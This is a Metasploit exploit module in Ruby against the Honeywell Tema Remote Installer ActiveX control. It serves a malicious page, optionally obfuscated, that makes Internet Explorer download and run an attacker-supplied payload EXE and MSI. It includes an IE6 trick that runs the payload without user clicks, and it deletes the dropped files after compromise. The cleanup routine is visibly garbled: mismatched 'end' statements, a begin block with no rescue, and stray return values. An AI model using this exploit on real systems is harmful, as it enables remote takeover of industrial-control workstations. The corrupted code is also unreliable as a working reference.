# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Honeywell Tema Remote Installer ActiveX Remote Code Execution",
      &#039;Description&#039;    => %q{
          This modules exploits a vulnerability found in the Honewell Tema ActiveX Remote
        Installer.  This ActiveX control can be abused by using the DownloadFromURL()
        function to install an arbitrary MSI from a remote location without checking source
        authenticity or user notification. This module has been tested successfully with
        the Remote Installer ActiveX installed with HoneyWell EBI R410.1 - TEMA 5.3.0 and
        Internet Explorer 6, 7 and 8 on Windows XP SP3.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Billy Rios&#039;, # Vulnerability discovery
          &#039;Terry McCorkle&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039;  # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;76681&#039; ],
          [ &#039;BID&#039;, &#039;50078&#039; ],
          [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICSA-11-285-01.pdf&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 2048,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039;         => "none",
          &#039;InitialAutoRunScript&#039; => &#039;migrate -k -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # HoneyWell EBI R410.1 - TEMA 5.3.0
          # Tema_RemoteInstaller.ocx 1.0.0.0
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 20 2011",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)
  end

  def exploit
    @dropped_files = [
      &#039;payload.exe&#039;,
      &#039;ThinClient_TemaKit.msi&#039;,
      &#039;ThinClient_TemaKit.log&#039;
    ]
    super
  end

  def on_new_session(session)
      session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
    end

    @dropped_files.each do |file|
      win_file = file.gsub("/", "\\\\")
        begin
          wintemp = session.fs.file.expand_path("%WINDIR%")
          win_file = "#{wintemp}\\Temp\\#{win_file}"
          # fs.file.rm().  Until that has been implemented, remove the
          # read-only flag with a command.
          session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
          session.fs.file.rm(win_file)
          print_good("Deleted #{file}")
          true
          print_error("Failed to delete #{win_file}")
          false
        end

      end
    end

  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]

    # Windows 7 isn&#039;t normally supported because the user won&#039;t have write access to the
    # %WINDIR%/Temp directory, where the downloaded components are stored.
    if not (agent =~ /MSIE \d/ and agent =~ /NT 5\.1/) and agent !~ /Tema_RemoteInstaller/
      print_error("Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    end

    # exec_payload.msi needs it to be named payload.exe
    # atm there isn&#039;t msi generation on the fly
    if request.uri =~ /payload\.exe$/
      return if ((p=regenerate_payload(cli))==nil)
      data = generate_payload_exe({:code=>p.encoded})
      print_status("Sending payload")
      send_response(cli, data, {&#039;Content-Type&#039;=>&#039;application/octet-stream&#039;})
      return
    end

    if request.uri =~ /\.msi$/
      msi_source = ::File.join(Msf::Config.install_root, "data", "exploits", "exec_payload.msi")
      source = ::File.open(msi_source, "rb"){|fd| fd.read(fd.stat.size) }
      print_status("Sending msi")
      send_response(cli, source, {&#039;Content-Type&#039;=>&#039;application/octet-stream&#039;})
      return
    end

    if agent =~ /MSIE 6/
      # The &#039;setTimeout&#039; trick allows to execute the installer on IE6 even if the user
      # doesn&#039;t click the warning popup when downloading the payload.
      # The ThinClient_TemaKit.msi installer name must be static.
      # <object id="obj" classid="clsid:E01DF79C-BE0C-4999-9B13-B5F7B2306E9B">
      js = <<-EOS
      var obj = new ActiveXObject(&#039;Tema_RemoteInstaller.RemoteInstaller&#039;);
      setTimeout("obj.DownloadFromURL(&#039;#{get_uri}/ThinClient_TemaKit.msi&#039;);", 1000);
      obj.DownloadFromURL(&#039;#{get_uri}/payload.exe&#039;);
      EOS
    else
      js = <<-EOS
      var obj = new ActiveXObject(&#039;Tema_RemoteInstaller.RemoteInstaller&#039;);
      obj.DownloadFromURL(&#039;#{get_uri}/payload.exe&#039;);
      obj.DownloadFromURL(&#039;#{get_uri}/ThinClient_TemaKit.msi&#039;);
      EOS
    end

    js.gsub!(/\t\t\t/, "")

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    html = <<-EOS
    <html>
    <body>
    </object>
    <script>
    #{js}
    </script>
    </body>
    </html>
    EOS

    print_status("Sending html")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})

  end

end

